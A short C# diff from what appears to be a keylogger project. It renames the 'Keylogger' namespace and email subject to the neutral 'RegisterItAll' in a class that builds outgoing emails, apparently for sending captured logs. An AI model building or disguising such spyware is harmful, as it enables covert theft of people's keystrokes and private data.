@@ -2,7 +2,7 @@
 using System.Net.Mail;
 using System.Text;
 
-namespace Keylogger.Managers
+namespace RegisterItAll.Managers
 {
     public class EmailsSender
     {
@@ -11,7 +11,7 @@ namespace Keylogger.Managers
             MailMessage message = new MailMessage()
             {
                 From = new MailAddress("alguncorreo@hotmail.com", displayName: null, Encoding.UTF8),
-                Subject = "KeyLogger",
+                Subject = "RegisterItAll",
                 SubjectEncoding = Encoding.UTF8,
                 BodyEncoding = Encoding.UTF8,
             };
